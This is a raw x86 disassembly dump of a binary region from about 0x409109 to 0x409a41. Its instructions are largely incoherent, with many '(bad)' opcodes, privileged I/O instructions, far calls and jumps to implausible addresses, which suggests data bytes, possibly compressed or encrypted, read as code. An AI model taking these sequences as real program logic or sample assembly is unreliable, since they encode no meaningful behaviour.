  409109:	add    dh,BYTE PTR [ecx]
  40910b:	call   DWORD PTR [ebx+0x2b]
  40910e:	mov    edi,0x6cdb3407
  409113:	inc    DWORD PTR [ebx+0x3b]
  409116:	jg     0x4090fc
  409118:	inc    ebx
  409119:	inc    ebx
  40911a:	cmp    eax,ebp
  40911c:	jne    0x40912e
  40911e:	cmp    edi,edi
  409120:	sub    ebx,DWORD PTR [ecx]
  409122:	sub    al,0xf7
  409124:	and    ebx,DWORD PTR [ebx+0x14]
  409127:	cs icebp 
  409129:	bound  edi,QWORD PTR [ecx]
  40912b:	(bad)  
  40912c:	fstp   DWORD PTR [ecx+0x31]
  40912f:	dec    DWORD PTR [ebx]
  409131:	xchg   ch,ch
  409133:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409134:	add    edi,DWORD PTR [ebx+0x39]
  409137:	mov    ch,0xe4
  409139:	jp     0x409174
  40913b:	jmp    esp
  40913d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40913e:	ins    DWORD PTR es:[edi],dx
  40913f:	(bad)  
  409140:	jmp    0x4090d4
  409142:	jg     0x409120
  409144:	fistp  DWORD PTR [edx+0x4889e837]
  40914a:	cmp    edi,edi
  40914c:	shl    DWORD PTR [eax+0x3c],cl
  40914f:	test   ebx,0x907537b2
  409155:	mov    edx,0x80a407bd
  40915a:	cmp    bh,bh
  40915c:	mov    bl,0xca
  40915e:	jge    0x409150
  409160:	mov    ds:0xe837d2,eax
	...
  409175:	add    BYTE PTR [eax],al
  409177:	add    BYTE PTR [ebp-0x6400c7ef],bl
  40917d:	push   0xeb3de924
  409182:	aaa    
  409183:	dec    DWORD PTR [ebx+0x74301494]
  409189:	mov    DWORD PTR [eax+0x3],esi
  40918c:	mov    ebp,cs
  40918e:	mov    ds:0x6a4073ff,al
  409193:	pop    ds
  409194:	(bad)  
  409196:	mov    WORD PTR [ebp+0x30de2d63],ds
  40919c:	loope  0x40912a
  40919e:	mov    DWORD PTR [esi+ebp*1],eax
  4091a1:	fwait
  4091a2:	gs jp  0x409176
  4091a5:	cwde   
  4091a6:	fdivr  st,st(3)
  4091a8:	out    0x55,al
  4091aa:	loope  0x4091dc
  4091ac:	cmp    DWORD PTR [eax+ebp*4-0x2465cc3e],0x4ba233fb
  4091b7:	xor    BYTE PTR [ebx],ah
  4091b9:	sub    al,0xf9
  4091bb:	int3   
  4091bc:	int3   
  4091bd:	xchg   esp,eax
  4091be:	leave  
  4091bf:	add    eax,0x3061948c
  4091c4:	or     DWORD PTR [ecx+ebx*1+0x159b0127],0x1d988130
  4091cf:	mov    dh,0x8b
  4091d1:	lods   al,BYTE PTR ds:[esi]
  4091d2:	(bad)  
  4091d3:	gs jmp 0x409170
  4091d6:	aaa    
  4091d7:	inc    ebp
  4091d8:	mov    BYTE PTR [esp+ebx*4+0x7c],dl
	...
  4091ef:	add    al,ch
  4091f1:	adc    al,0x25
  4091f3:	pop    ds
  4091f4:	fistp  DWORD PTR [edx-0x67ae821b]
  4091fa:	xor    BYTE PTR [edi],ch
  4091fc:	cmp    DWORD PTR [esi+edx*8-0x71537847],eax
  409203:	xchg   esp,eax
  409204:	mov    WORD PTR [edx+ebp*8+0x7e119b43],ss
  40920b:	add    al,0x8c
  40920d:	xchg   esp,eax
  40920e:	scas   al,BYTE PTR es:[edi]
  40920f:	leave  
  409210:	mov    ds:0x8fe90893,eax
  409215:	xchg   esp,eax
  409216:	iret   
  409217:	and    al,0xc4
  409219:	cdq    
  40921a:	push   cs
  40921b:	jmp    0x1348c0af
  409220:	nop
  409221:	or     BYTE PTR cs:[ebx],al
  409224:	mov    BYTE PTR [edi],al
  409226:	dec    ebp
  409227:	xchg   ebp,eax
  409228:	inc    eax
  409229:	or     DWORD PTR [ebp-0x9666483],ecx
  40922f:	sbb    DWORD PTR [ebx+0x1576f01f],ebp
  409235:	sahf   
  409236:	fisttp WORD PTR [edi+0x20]
  409239:	xchg   ebp,eax
  40923a:	or     dl,dh
  40923c:	iret   
  40923d:	and    BYTE PTR [edx],cl
  40923f:	push   edx
  409240:	push   ebp
  409241:	or     DWORD PTR [ebp-0x96684bb],ecx
  409247:	mov    ecx,0x3efc100c
  40924c:	jae    0x4091e7
  40924e:	push   edi
  40924f:	ds aad 0x89
  409252:	idiv   DWORD PTR [eax+eax*1+0x0]
	...
  409265:	add    BYTE PTR [eax],al
  409267:	add    BYTE PTR [ebx],dl
  409269:	mov    dl,0x48
  40926b:	xchg   BYTE PTR [ebx-0x47937f67],bh
  409271:	mov    eax,ds:0xd9f71ef6
  409276:	jnp    0x409243
  409278:	push   cs
  409279:	fsub   st,st(3)
  40927b:	push   ss
  40927c:	mov    ebx,0x907d0799
  409281:	sub    al,0x8
  409283:	jmp    0x3d376d02
  409288:	lods   al,BYTE PTR ds:[esi]
  409289:	mov    eax,ds:0xdf7aeef6
  40928e:	neg    esi
  409290:	jb     0x40922b
  409292:	not    BYTE PTR [eax+edi*4-0x4f]
  409296:	mov    esp,0xf69962a0
  40929b:	xchg   esp,eax
  40929c:	pop    edi
  40929d:	mov    eax,ds:0x7dca00f6
  4092a2:	cli    
  4092a3:	mov    ds:0x45f76ada,eax
  4092a8:	fnstsw WORD PTR [esi-0x78]
  4092ab:	inc    eax
  4092ad:	fs loopne 0x4092c1
  4092b0:	add    eax,0x27c90896
  4092b5:	cdq    
  4092b6:	not    BYTE PTR [esi+ebp*8+0x79]
  4092ba:	mov    eax,esp
  4092bc:	sbb    ebx,edi
  4092be:	imul   BYTE PTR [ecx+0x6d]
  4092c1:	push   0x7d
  4092c3:	or     ch,bh
  4092c5:	xchg   ecx,eax
  4092c6:	test   eax,0x4d18daff
  4092cb:	cld    
	...
  4092e0:	lea    esi,[ebx+0x6a354151]
  4092e6:	cmp    eax,0xf6cffdd8
  4092eb:	(bad)  
  4092ec:	push   eax
  4092ed:	popf   
  4092ee:	out    dx,al
  4092ef:	and    eax,0x68f76ada
  4092f4:	js     0x4092c3
  4092f6:	inc    edi
  4092f7:	add    BYTE PTR ds:0xa5000893,bh
  4092fd:	push   0x7d
  4092ff:	or     BYTE PTR [ebp-0x7a],cl
  409302:	idiv   edi
  409304:	stos   BYTE PTR es:[edi],al
  409305:	std    
  409306:	dec    esp
  409307:	pop    ebx
  409308:	and    al,0x95
  40930a:	div    DWORD PTR ds:0x47ddbd
  409310:	call   0xf769:0xf5e80edc
  409317:	(bad)  
  409318:	std    
  409319:	into   
  40931a:	push   ecx
  40931b:	inc    ecx
  40931c:	in     eax,0xfc
  40931e:	or     BYTE PTR [eax],al
  409320:	mov    ch,0x14
  409322:	div    DWORD PTR [ebp-0x43]
  409325:	jl     0x40930d
  409327:	(bad)  
  409328:	fisub  DWORD PTR [esi-0x9]
  40932b:	jne    0x4092b9
  40932d:	mov    edi,0xd3947524
  409332:	mov    al,ds:0xc232d1a3
  409338:	nop
  409339:	stos   DWORD PTR es:[edi],eax
  40933a:	fisttp QWORD PTR [edx+0xbbee1a0]
  409340:	je     0x409330
  409342:	ins    BYTE PTR es:[edi],dx
  409343:	inc    DWORD PTR [eax]
	...
  409355:	add    BYTE PTR [eax],al
  409357:	add    BYTE PTR [ebx-0x358bb55d],al
  40935d:	test   DWORD PTR [ebp-0x255232a6],esp
  409363:	out    0xd8,eax
  409365:	dec    esi
  409366:	and    eax,0xdc7dbcff
  40936b:	mov    WORD PTR [di-0x41ed],gs
  409370:	in     al,0x94
  409372:	rol    DWORD PTR [eax-0x74],0x7d
  409376:	and    eax,0xff459475
  40937b:	retf   
  40937c:	cmp    esi,DWORD PTR [edi]
  40937e:	les    esp,FWORD PTR [edi-0x73]
  409381:	lods   eax,DWORD PTR ds:[esi]
  409382:	adc    edi,DWORD PTR [esi+0x40bfd7b4]
  409388:	mov    ebp,?
  40938a:	and    esi,DWORD PTR [ebp-0x7c]
  40938d:	inc    ebp
  40938e:	jmp    0x40935b
  409390:	adc    ebx,DWORD PTR [edi-0x3c]
  409393:	mov    gs,WORD PTR [di-0x41ed]
  409398:	je     0x409394
  40939a:	mov    edi,0x23dd8c40
  40939f:	jne    0x409325
  4093a1:	xchg   ebp,eax
  4093a2:	test   ebx,0x161486eb
  4093a8:	das    
  4093a9:	(bad)  
  4093aa:	and    eax,0xaa5cec9
  4093af:	push   ebp
  4093b0:	pop    es
  4093b1:	xchg   edx,eax
  4093b2:	mov    esp,eax
  4093b4:	enter  0xb13,0x6a
  4093b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093b9:	xchg   esp,eax
  4093ba:	out    dx,al
  4093bb:	mov    dh,0x0
	...
  4093cd:	add    BYTE PTR [eax],al
  4093cf:	add    BYTE PTR [ebx-0x4c9bd754],dl
  4093d5:	xchg   edi,eax
  4093d6:	addr16 (bad) 
  4093d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093d9:	sub    bh,bl
  4093db:	sub    al,0x19
  4093dd:	mov    ecx,ds
  4093df:	sbb    DWORD PTR [ebx+0x6e99b597],0xffffff97
  4093e6:	xor    edi,esp
  4093e8:	jae    0x409408
  4093ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093eb:	sub    al,0x83
  4093ed:	sub    cl,BYTE PTR ds:0x998d012d
  4093f3:	lahf   
  4093f4:	jb     0x40938d
  4093f6:	popf   
  4093f7:	sub    al,0xe1
  4093f9:	cwde   
  4093fa:	test   DWORD PTR [esi+0x6412ac8b],esi
  409400:	pop    ebx
  409401:	xchg   edi,eax
  409402:	mov    bh,0x41
  409404:	mov    BYTE PTR [esp+edx*1-0x52ecc787],dl
  40940b:	das    
  40940c:	inc    ebx
  40940d:	and    ebp,edi
  40940f:	sbb    edx,DWORD PTR [esi-0x78d3aa11]
  409415:	aam    0xed
  409417:	xchg   edi,ebp
  409419:	xchg   ebx,eax
  40941a:	loope  0x40941f
  40941c:	adc    eax,0x99804d51
  409421:	test   cl,ah
  409423:	mov    bh,0x81
  409425:	xchg   edi,eax
  409426:	mov    bl,0x13
  409428:	or     esp,DWORD PTR [ecx]
  40942a:	and    eax,0x2dee251b
  40942f:	sub    al,0x5
  409431:	push   ecx
  409432:	adc    eax,0x9b
	...
  409447:	add    BYTE PTR ds:0xeb03a03b,dl
  40944d:	and    BYTE PTR ds:0xdee991b,al
  409453:	sub    al,0x3c
  409455:	sub    al,0xe1
  409457:	add    esp,ebx
  409459:	aad    0x7
  40945b:	cdq    
  40945c:	js     0x40947f
  40945e:	add    BYTE PTR [ecx],al
  409460:	sbb    ecx,esp
  409462:	mul    dh
  409464:	cwde   
  409465:	adc    ch,BYTE PTR [edx-0x3fd39822]
  40946b:	xor    dl,cl
  40946d:	xchg   esi,eax
  40946e:	cmc    
  40946f:	push   esp
  409470:	je     0x40941e
  409472:	sbb    ecx,DWORD PTR [edi+0x51579767]
  409478:	mov    DWORD PTR [edi+eiz*8+0x7c976077],edx
  40947f:	loope  0x409428
  409481:	and    eax,eax
  409483:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409484:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409485:	lods   al,BYTE PTR ds:[esi]
  409486:	push   0x5f95a74b
  40948b:	inc    edi
  40948c:	pop    ebx
  40948d:	push   ebp
  40948e:	or     BYTE PTR [esi+0x7adf9a1d],cl
  409494:	in     eax,dx
  409495:	xchg   ebp,eax
  409496:	neg    BYTE PTR [ecx]
  409498:	lock xchg ebp,eax
  40949a:	test   BYTE PTR [esi-0xb08bb4a],0x47
  4094a1:	scas   al,BYTE PTR es:[edi]
  4094a2:	pop    ecx
  4094a3:	xor    DWORD PTR [edi-0x6b],esp
  4094a6:	fild   QWORD PTR [ecx-0x3e096a57]
	...
  4094c0:	(bad)  
  4094c1:	cmp    DWORD PTR [ecx-0x17],ecx
  4094c4:	jbe    0x4094e5
  4094c6:	hlt    
  4094c7:	push   ecx
  4094c8:	ret    0xf6ef
  4094cb:	cmp    BYTE PTR ds:[esi],ch
  4094ce:	or     ecx,ebp
  4094d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094d1:	(bad)  
  4094d2:	push   edi
  4094d3:	cs cmp eax,0xb7d8e08e
  4094d9:	xchg   ebp,eax
  4094da:	not    BYTE PTR [ecx]
  4094dc:	xchg   edx,esi
  4094de:	not    BYTE PTR [esi]
  4094e0:	mov    bh,0x1f
  4094e2:	hlt    
  4094e3:	add    DWORD PTR [edi-0xe],edi
  4094e6:	test   BYTE PTR [eax],0x92
  4094e9:	push   edi
  4094ea:	retf   0xe50c
  4094ed:	les    eax,FWORD PTR [ecx-0xbabc914]
  4094f3:	push   0xffffffb5
  4094f5:	not    DWORD PTR [eax]
  4094f7:	call   FWORD PTR [eax-0x68]
  4094fa:	out    dx,al
  4094fb:	cmp    DWORD PTR [edx],esi
  4094fd:	push   0xfffffff7
  4094ff:	mov    DWORD PTR [eax+0x6c],edi
  409502:	bound  eax,QWORD PTR [eax]
  409504:	dec    edi
  409505:	xchg   bh,dh
  409507:	jne    0x4094a6
  409509:	jns    0x409535
  40950b:	call   edx
  40950d:	push   0x62
  40950f:	add    bh,cl
  409511:	lods   eax,DWORD PTR ds:[esi]
  409512:	cmc    
  409513:	jne    0x409582
  409515:	jns    0x409535
  409517:	push   DWORD PTR [edx]
  409519:	push   0x62
  40951b:	add    BYTE PTR [edi+0x6d75f78c],bl
  409521:	jns    0x409525
  409523:	inc    DWORD PTR [eax]
	...
  409535:	add    BYTE PTR [eax],al
  409537:	add    BYTE PTR [edx],dl
  409539:	push   0x60
  40953b:	cld    
  40953c:	scas   al,BYTE PTR es:[edi]
  40953d:	iret   
  40953e:	imul   BYTE PTR [ecx+0x6f]
  409541:	push   0x7d
  409543:	or     BYTE PTR ds:0xb2fff666,cl
  409549:	stc    
  40954a:	repnz pop ebx
  40954c:	in     al,0x90
  40954e:	bound  esp,QWORD PTR [ebx]
  409550:	shl    ah,cl
  409552:	push   cs
  409553:	call   0x380129
  409558:	dec    ebp
  409559:	ins    DWORD PTR es:[edi],dx
  40955a:	push   ebx
  40955b:	inc    ecx
  40955c:	and    eax,0xd8ff12f7
  409561:	cwde   
  409562:	out    dx,al
  409563:	ffree  st(3)
  409565:	push   0xfffffff7
  409567:	(bad)  
  409568:	cmp    BYTE PTR [ebp-0x9],ch
  40956b:	jne    0x40956a
  40956d:	js     0x409597
  40956f:	lahf   
  409570:	xchg   edx,eax
  409571:	push   0xffffffc1
  409573:	ret    0xa78c
  409576:	or     dl,BYTE PTR [ebp+0x17]
  409579:	xchg   edi,eax
  40957a:	mov    al,ah
  40957c:	in     al,0x95
  40957e:	and    bh,bh
  409580:	add    eax,esi
  409582:	cs push eax
  409584:	retf   
  409585:	pop    ss
  409586:	sbb    edi,edi
  409588:	cmp    DWORD PTR [edi-0x54f647ee],esi
  40958e:	or     cl,BYTE PTR [ebx]
  409590:	int3   
  409591:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409592:	jne    0x4095db
  409594:	lea    ebp,[ebx-0x3cb638f6]
  40959a:	or     eax,DWORD PTR [eax]
	...
  4095b0:	mov    WORD PTR [ebx-0x2a67bab9],gs
  4095b6:	or     BYTE PTR [eax],al
  4095b8:	mov    edi,ss
  4095ba:	or     al,0x6a
  4095bc:	mov    edi,ss
  4095be:	or     al,0x6a
  4095c0:	mov    WORD PTR [eax],cs
  4095c2:	mov    dh,0xf3
  4095c4:	fadd   QWORD PTR [eax]
  4095c6:	jbe    0x4095bc
  4095c8:	arpl   WORD PTR [ebx],bp
  4095ca:	and    BYTE PTR [eax+0x63],dl
  4095cd:	test   eax,0x19e1ff24
  4095d2:	adc    eax,0xa7e018a
  4095d7:	or     ecx,DWORD PTR [edx+edx*4-0x9]
  4095db:	call   0x4b1276
  4095e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095e1:	xor    DWORD PTR [ebp-0x5a0d73c0],esi
  4095e7:	sysenter 
  4095e9:	(bad)  
  4095ea:	push   0x754e23ff
  4095ef:	ror    BYTE PTR [ecx],1
  4095f1:	add    DWORD PTR [ecx],edi
  4095f3:	not    DWORD PTR [ebx]
  4095f5:	rcr    esp,cl
  4095f7:	push   ecx
  4095f8:	hlt    
  4095f9:	mov    dh,0x68
  4095fb:	inc    DWORD PTR [ebx]
  4095fd:	cmc    
  4095fe:	jne    0x4095f0
  409600:	add    edx,DWORD PTR [ebp-0x4a1bd6d2]
  409606:	inc    eax
  409607:	sub    ebx,ebp
  409609:	(bad)  
  40960a:	fistp  WORD PTR [ebx+0x3a0f046]
  409610:	fisttp DWORD PTR [ecx-0x10]
  409613:	xor    BYTE PTR [eax],al
	...
  409625:	add    BYTE PTR [eax],al
  409627:	add    bl,dl
  409629:	xchg   ebx,eax
  40962a:	imul   DWORD PTR [esi+0x5fc47c97]
  409630:	ret    
  409631:	xchg   ebx,eax
  409632:	imul   edi,DWORD PTR [edi-0x58],0x2628ef8b
  409639:	xchg   esp,eax
  40963a:	push   edi
  40963b:	mov    eax,ds:0x28dfd547
  409640:	fld    DWORD PTR [edi+ebx*8+0x35939b28]
  409647:	clc    
  409648:	stos   DWORD PTR es:[edi],eax
  409649:	popf   
  40964a:	mov    ebp,DWORD PTR [eax]
  40964c:	mov    ebx,DWORD PTR ds:0x937b1b65
  409652:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409653:	test   BYTE PTR [ecx],bh
  409655:	adc    BYTE PTR [edi+0x1b947328],0xf4
  40965c:	repz xchg esp,eax
  40965e:	fistp  WORD PTR [eax]
  409660:	and    bh,ah
  409662:	ret    0xccc7
  409665:	xchg   esp,eax
  409666:	mov    gs,WORD PTR [esi+0x60]
  409669:	mov    esi,DWORD PTR [edi+0x28]
  40966c:	dec    ebx
  40966d:	or     eax,ebp
  40966f:	sbb    eax,DWORD PTR [eax]
  409671:	pop    ebp
  409672:	sub    BYTE PTR [si-0x206b],ah
  409677:	sbb    dl,dh
  409679:	sti    
  40967a:	add    al,0xc8
  40967c:	int3   
  40967d:	xchg   esp,eax
  40967e:	pop    esi
  40967f:	outs   dx,BYTE PTR ds:[esi]
  409680:	xor    BYTE PTR [ebx+0x91b2847],cl
  409686:	clc    
  409687:	sbb    ebp,eax
  409689:	pop    esp
  40968a:	aaa    
  40968b:	sub    BYTE PTR [eax],al
	...
  40969d:	add    BYTE PTR [eax],al
  40969f:	add    BYTE PTR [edi],cl
  4096a1:	push   ecx
  4096a2:	or     DWORD PTR [ecx-0x44],eax
  4096a5:	xchg   ebx,eax
  4096a6:	imul   cl
  4096a8:	sub    eax,ebx
  4096aa:	pusha  
  4096ab:	jmp    0x91f81a3f
  4096b0:	lock out dx,al
  4096b2:	inc    edi
  4096b3:	jmp    0x1721e06c
  4096b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096b9:	xchg   ebx,eax
  4096ba:	idiv   BYTE PTR [edi+edx*8+0x7a]
  4096be:	mov    dh,BYTE PTR [eax]
  4096c0:	je     0x409655
  4096c2:	popa   
  4096c3:	call   0x81f81a57
  4096c8:	loop   0x4096b8
  4096ca:	inc    edi
  4096cb:	jmp    0xd721e03a
  4096d0:	jae    0x409665
  4096d2:	neg    BYTE PTR [eax+eiz*4+0x7a]
  4096d6:	bound  esp,QWORD PTR [eax+0x7cf69373]
  4096dc:	je     0x409669
  4096de:	idiv   BYTE PTR [esi-0x4956fd58]
  4096e4:	stos   DWORD PTR es:[edi],eax
  4096e5:	xchg   ecx,eax
  4096e6:	mov    esp,0xf691abc1
  4096eb:	xchg   ecx,eax
  4096ec:	das    
  4096ed:	xor    dh,dh
  4096ef:	sahf   
  4096f0:	mov    bl,0x47
  4096f2:	stc    
  4096f3:	sahf   
  4096f4:	stos   DWORD PTR es:[edi],eax
  4096f5:	xchg   ecx,eax
  4096f6:	not    BYTE PTR [esp+edx*2]
  4096f9:	xchg   ebx,eax
  4096fa:	jl     0x4096ed
  4096fc:	ja     0x409746
  4096fe:	idiv   DWORD PTR [esi+0x73]
  409701:	xchg   ecx,eax
  409702:	mov    esp,0x79
	...
  409717:	add    BYTE PTR [ebx-0x6f],dh
  40971a:	test   BYTE PTR [ecx+0x66f631fb],0x6b
  409721:	xlat   BYTE PTR ds:[ebx]
  409722:	lock push eax
  409724:	push   0x6b56f692
  409729:	pop    es
  40972a:	cmc    
  40972b:	inc    ecx
  40972c:	out    dx,eax
  40972d:	sbb    eax,0xd1250009
  409732:	retf   0xf50c
  409735:	fs sub esp,0xffffffba
  409739:	inc    ebx
  40973a:	add    ch,al
  40973c:	gs hlt 
  40973e:	cmc    
  40973f:	(bad)  
  409740:	(bad)  
  409741:	aad    0x7c
  409743:	cmp    ebp,edi
  409745:	adc    BYTE PTR [edx+0x41],0xf5
  409749:	gs out dx,al
  40974b:	or     al,0x51
  40974d:	mov    ecx,0x2df550f5
  409752:	idiv   bh
  409754:	call   0xf659:0x192360fa
  40975b:	dec    edi
  40975c:	stos   BYTE PTR es:[edi],al
  40975d:	inc    esp
  40975e:	push   cs
  40975f:	call   0x366537
  409764:	dec    ebp
  409765:	xor    BYTE PTR [ecx],cl
  409767:	add    dl,cl
  409769:	mul    DWORD PTR [eax+0x2d]
  40976c:	imul   edx,DWORD PTR [edi-0xa],0xe44ca4f
  409773:	call   0x3664cf
  409778:	dec    ebp
  409779:	scas   al,BYTE PTR es:[edi]
  40977a:	xchg   ebp,eax
  40977b:	inc    DWORD PTR [eax]
	...
  40978d:	add    BYTE PTR [eax],al
  40978f:	add    BYTE PTR [edx],ch
  409791:	ror    dl,1
  409793:	or     BYTE PTR [ebp+0x64],ah
  409796:	sub    esp,0xfffffff6
  409799:	shl    esp,1
  40979b:	push   esi
  40979c:	mov    ds:0x5e69f62e,al
  4097a1:	mov    edx,0x8dfd087b
  4097a6:	xchg   ebp,eax
  4097a7:	dec    edx
  4097a9:	adc    BYTE PTR [esp+edi*8-0x52],cl
  4097ad:	test   BYTE PTR [edx+0x48],dl
  4097b0:	fs cwde 
  4097b2:	cmp    DWORD PTR ds:0x494d45,0xef67ab5
  4097bc:	mov    edi,?
  4097be:	bound  eax,QWORD PTR [eax]
  4097c0:	mov    WORD PTR [ebx-0x6e],?
  4097c3:	pop    ss
  4097c4:	mov    al,0x3c
  4097c6:	or     dl,BYTE PTR [esi-0xc]
  4097c9:	mov    BYTE PTR [esi+0x0],bh
  4097cc:	mov    WORD PTR [esi+0x4a],?
  4097cf:	je     0x40981b
  4097d1:	cmp    ecx,DWORD PTR [edx+0x768a8c38]
  4097d7:	xchg   DWORD PTR [ebx+edi*2-0x7c8baff6],ecx
  4097de:	into   
  4097df:	inc    eax
  4097e0:	mov    WORD PTR [ebx+0x7b8c8990],ss
  4097e6:	rol    BYTE PTR [edx],0xce
  4097e9:	sub    dl,BYTE PTR [edx]
  4097eb:	pusha  
  4097ec:	cmc    
  4097ed:	mov    DWORD PTR [eax+edx*2],ebp
  4097f0:	pop    esp
  4097f1:	adc    ecx,DWORD PTR [edx]
	...
  409807:	add    BYTE PTR [ebx+0x48229538],ah
  40980d:	mov    esp,0xefa3500c
  409812:	hlt    
  409813:	out    0x27,eax
  409815:	xor    ebp,DWORD PTR [edi+edi*8]
  409818:	xor    al,0xe3
  40981a:	or     DWORD PTR [eax],eax
  40981c:	jnp    0x40982e
  40981e:	xchg   ebp,eax
  40981f:	sub    al,0xe0
  409821:	mov    esp,0xc97b500c
  409826:	hlt    
  409827:	out    0xdb,eax
  409829:	inc    ebp
  40982a:	sub    al,0xff
  40982c:	je     0x4097cc
  40982e:	mov    edi,edi
  409830:	arpl   WORD PTR [ebx],dx
  409832:	enter  0x7c67,0xc1
  409836:	leave  
  409837:	(bad)  
  409838:	mov    edx,0x8c8b3425
  40983d:	jge    0x409830
  40983f:	mov    edi,0xe7c451b8
  409844:	xchg   edi,eax
  409845:	aam    0x2b
  409847:	(bad)  
  409848:	fcom   QWORD PTR [edi+ebp*4+0x47902b9b]
  40984f:	data16 mov ah,0xb3
  409852:	mov    ebx,0x46e01bc2
  409857:	scas   eax,DWORD PTR es:[edi]
  409858:	mov    edi,DWORD PTR [esi+eax*1+0x3c]
  40985c:	or     edx,DWORD PTR [eax-0x6b736458]
  409862:	dec    esi
  409863:	rol    WORD PTR fs:[ebx+0x2edff3c2],0xaf
	...
  409880:	xchg   ebx,eax
  409881:	jl     0x409875
  409883:	cmp    esp,ebx
  409885:	(bad)
  409889:	pop    DWORD PTR [edi]
  40988b:	sbb    DWORD PTR [ebp-0x3419a02a],ecx
  409891:	or     BYTE PTR [edx],cl
  409893:	mov    esi,0x6b1fc3c7
  409898:	mov    ebx,0xbe24e78f
  40989d:	ds sub ch,bh
  4098a0:	call   0x4a8f:0xa3252d19
  4098a7:	or     bl,BYTE PTR [ebx-0x30e417f7]
  4098ad:	mov    cs,edi
  4098af:	and    al,0xf6
  4098b1:	mov    bl,0xb6
  4098b3:	scas   al,BYTE PTR es:[edi]
  4098b4:	mov    edi,DWORD PTR [ecx+edi*2+0x25]
  4098b8:	jnp    0x409849
  4098ba:	dec    edx
  4098bb:	or     BYTE PTR [ebx+0x9],dh
  4098be:	clc    
  4098bf:	sbb    edi,DWORD PTR [ebx]
  4098c1:	mov    ss,WORD PTR [edi+0x3bddf424]
  4098c7:	ret    
  4098c8:	pop    ebx
  4098c9:	mov    ds,ebp
  4098cb:	dec    ebx
  4098cc:	(bad)  
  4098cd:	aad    0xdf
  4098cf:	and    al,0xc1
  4098d1:	pushf  
  4098d2:	xchg   edi,eax
  4098d3:	repnz inc eax
  4098d5:	(bad)
  4098d9:	fcom   QWORD PTR [eax+ebp*1-0x78]
  4098dd:	cld    
  4098de:	or     ch,cl
  4098e0:	(bad)  
  4098e1:	adc    al,0xf6
  4098e3:	aam    0x0
	...
  4098f5:	add    BYTE PTR [eax],al
  4098f7:	add    BYTE PTR [edi],ah
  4098f9:	ja     0x409911
  4098fb:	push   esp
  4098fc:	jo     0x40988d
  4098fe:	not    ah
  409900:	imul   ecx,DWORD PTR [edi-0x3b580e84],0xffffff94
  409907:	ds test al,0xef
  40990a:	push   esi
  40990b:	and    BYTE PTR [ebp-0x68],cl
  40990e:	or     BYTE PTR [esp+esi*2+0x3f2d8880],dl
  409915:	xchg   esi,esi
  409917:	push   ds
  409918:	pop    edx
  409919:	fxtract 
  40991b:	mov    ecx,0xe1909b0
  409920:	and    bl,BYTE PTR [ebx-0x6bbad020]
  409926:	or     dl,dh
  409928:	dec    edi
  409929:	lahf   
  40992a:	mov    ebp,DWORD PTR [ebx+0x2608948d]
  409930:	xacquire xchg BYTE PTR [ecx],cl
  409933:	jmp    0x250e2dc7
  409938:	test   BYTE PTR [edi-0x57016f2],cl
  40993e:	or     BYTE PTR [ebx-0x78],al
  409941:	cli    
  409942:	or     BYTE PTR [ebx-0x70],dl
  409945:	pop    ds
  409946:	dec    esp
  409947:	mov    ch,0x38
  409949:	and    DWORD PTR [ebp+edi*4+0x19f68d97],ecx
  409950:	scas   eax,DWORD PTR es:[edi]
  409951:	pop    es
  409952:	icebp  
  409953:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409954:	add    eax,0x1281e18a
  409959:	xchg   ebp,eax
  40995a:	or     dl,ah
	...
  409970:	iret   
  409971:	or     BYTE PTR [eax+eax*4],cl
  409974:	test   DWORD PTR [edx+0x3a350008],edx
  40997a:	mov    edx,0xf5987448
  40997f:	jne    0x4099d6
  409981:	mov    edx,0xb1a2a1df
  409986:	pop    eax
  409987:	mov    esp,DWORD PTR [ebp+0x23]
  40998a:	mov    esp,?
  40998c:	mov    edx,0xd750f5b1
  409991:	mov    ecx,0xb1c2a1cf
  409996:	jg     0x40991d
  409998:	lds    ebp,FWORD PTR [ecx-0x7ea2000b]
  40999e:	xchg   esp,eax
  40999f:	inc    edx
  4099a1:	mul    BYTE PTR ds:[edi+0x32]
  4099a5:	dec    esi
  4099a6:	dec    ecx
  4099a7:	add    BYTE PTR [edx-0x7d080715],dh
  4099ad:	mov    cl,0xf5
  4099af:	jne    0x4099a2
  4099b1:	mov    ecx,0xb182a13a
  4099b6:	jg     0x40993d
  4099b8:	cdq    
  4099b9:	test   eax,0x921ffff5
  4099be:	pusha  
  4099bf:	js     0x4099e2
  4099c1:	pop    ecx
  4099c2:	idiv   dh
  4099c4:	js     0x40996e
  4099c6:	std    
  4099c7:	push   DWORD PTR [edx-0x42f3844e]
  4099cd:	mov    ch,BYTE PTR [ecx-0x73df3d01]
  4099d3:	in     al,dx
	...
  4099e8:	mov    edx,0x756af5b2
  4099ed:	cmp    DWORD PTR [ecx-0xa674ba4],ecx
  4099f3:	mov    ch,0x35
  4099f5:	stos   BYTE PTR es:[edi],al
  4099f6:	cmc    
  4099f7:	jmp    DWORD PTR [edx]
  4099f9:	sub    al,0x2
  4099fb:	call   0x368b31
  409a00:	fcomp  QWORD PTR [ecx+eiz*8]
  409a03:	test   DWORD PTR [esi+eiz*1-0x6c7395d5],0x7bcd5c86
  409a0e:	sub    esi,DWORD PTR [ebp-0xd4f9c4]
  409a14:	cmp    edx,DWORD PTR [eax-0x24d217fa]
  409a1a:	sub    bh,bh
  409a1c:	adc    eax,0x23f73600
  409a21:	out    dx,al
  409a22:	cwde   
  409a23:	test   DWORD PTR [esi+ebp*8],ebp
  409a26:	sub    bh,bh
  409a28:	mov    esp,0x4d5c7453
  409a2d:	jnp    0x409a5a
  409a2f:	mov    ch,0xfc
  409a31:	lds    ebp,FWORD PTR [edx]
  409a33:	(bad)  
  409a34:	sti    
  409a35:	(bad)  
  409a36:	xor    cl,BYTE PTR [eax+0x4d]
  409a39:	jnp    0x409a5d
  409a3b:	mov    esi,0xb2ab62c
  409a40:	int3   
  409a41:	es cmc 
